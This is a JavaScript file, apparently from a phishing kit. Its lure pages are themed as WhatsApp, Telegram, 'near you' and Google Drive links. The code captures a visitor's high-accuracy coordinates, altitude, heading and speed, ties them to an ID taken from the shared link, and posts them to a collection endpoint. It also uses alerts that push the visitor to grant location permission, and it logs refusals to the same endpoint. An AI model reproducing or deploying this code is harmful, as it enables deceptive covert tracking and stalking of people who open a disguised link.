function locate(type = 'whatsapp')
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;
    var sharedId = window.location.href.split('/')[4];

    $.ajax({
      type: 'POST',
      // url: '/php/result.php',
      url: '/saveLocationData',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, urlId: sharedId},
      success: function(){
        if(type == 'whatsapp'){
          popup();
        } else if(type == 'telegram'){
          popup();
        } else if(type == 'nearyou'){
          $('#change').html('Coming Soon');
        } else if(type == 'gdrive'){
          window.location= redirectUrl;
        } else {
          popup();
        }
      },
      mimeType: 'text'
    });
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    // url: '/php/error.php',
    url: '/saveLocationData',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
